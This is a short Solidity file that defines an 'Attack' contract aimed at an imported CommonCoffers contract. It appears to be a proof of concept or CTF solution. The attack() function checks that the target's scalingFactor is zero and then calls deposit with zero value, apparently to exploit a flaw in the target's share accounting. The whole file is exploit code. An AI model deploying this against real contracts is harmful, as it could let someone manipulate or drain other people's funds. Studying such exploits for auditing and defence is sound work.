// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./CommonCoffers.sol";

contract Attack {
    CommonCoffers c;

    constructor(CommonCoffers _contractAddress) {
        c = CommonCoffers(_contractAddress);
    }

    function attack() public {
        require(
            c.scalingFactor() == 0,
            "scalingFactor > 0 send value > contract balance for successful attack"
        );
        c.deposit{value: 0}(address(this));
    }

    function getScalingFactor() public view returns (uint256) {
        return c.scalingFactor();
    }
}
